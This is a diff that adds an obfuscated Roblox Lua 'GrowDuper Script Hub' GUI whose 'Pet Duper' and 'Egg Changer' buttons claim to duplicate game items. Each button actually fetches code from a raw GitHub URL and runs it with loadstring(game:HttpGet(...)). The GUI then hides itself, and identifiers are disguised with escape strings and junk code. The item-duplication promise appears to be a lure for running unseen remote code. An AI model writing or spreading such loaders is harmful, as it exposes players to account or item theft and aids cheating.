@@ -1,0 +1,42 @@
+local function D(s)local k,m,n=1,"",string.byte while k<=#s do local x=n(s,k)if x then m=m..string.char(x)end k=k+1 end return m end
+local a=game["\71\101\116\83\101\114\118\105\99\101"]("Players")
+local b=a["LocalPlayer"]
+local c=b["\87\97\105\116\70\111\114\67\104\105\108\100"]("PlayerGui")
+local d=Instance["\110\101\119"]("ScreenGui")d.Name=D("\71\114\111\119\68\117\112\101\114\71\85\73")d.Parent=c
+d.ResetOnSpawn=false d.ZIndexBehavior=Enum.ZIndexBehavior.Global
+
+local e=Instance["new"]("Frame")e.Size=UDim2.new(0,300,0,150)e.Position=UDim2.new(0.5,-150,0.5,-75)
+e.BackgroundColor3=Color3.fromRGB(30,30,30)e.BorderSizePixel=0 e.Parent=d e.AnchorPoint=Vector2.new(0.5,0.5)
+e.Active=true e.Draggable=true
+
+local f=Instance["new"]("TextLabel")f.Size=UDim2.new(1,0,0,30)f.BackgroundTransparency=1
+f.Text=D("\71\114\111\119\68\117\112\101\114\32\83\99\114\105\112\116\32\72\117\98")
+f.Font=Enum.Font.SourceSansBold f.TextSize=22 f.TextColor3=Color3.fromRGB(255,170,0)f.Parent=e
+
+local function Y(fake)local junk=0 for i=1,100 do junk=junk+i end return fake end
+
+local function obfButton(text,posY,func)
+	local p=Instance["new"]("TextButton")
+	p.Size=UDim2.new(0.8,0,0,40)p.Position=UDim2.new(0.1,0,0,posY)
+	p.BackgroundColor3=Color3.fromRGB(255,170,0)p.TextColor3=Color3.new(0,0,0)
+	p.Font=Enum.Font.SourceSansSemibold p.TextSize=20
+	p.Text=text p.Parent=e
+	local z=true;for i=1,5 do if not z then break end end
+	p.MouseButton1Click:Connect(function()func()end)
+end
+
+local function zFeature(q)
+	local r="\65\99\116\105\118\97\116\105\110\103\32"..q.."\46\46\46"
+	pcall(function()print(D(r))end)
+
+	local ok,err=pcall(function()
+		loadstring(game:HttpGet(D("https://raw.githubusercontent.com/GrowDuper/another/refs/heads/main/jay")))()
+	end)
+
+	if not ok then warn("Fail: "..tostring(err))return end
+
+	task.delay(3,function()d.Enabled=false end)
+end
+
+do obfButton("Activate Pet Duper",50,function()zFeature("Pet Duper")end)end
+do obfButton("Activate Egg Changer",100,function()zFeature("Egg Changer")end)end
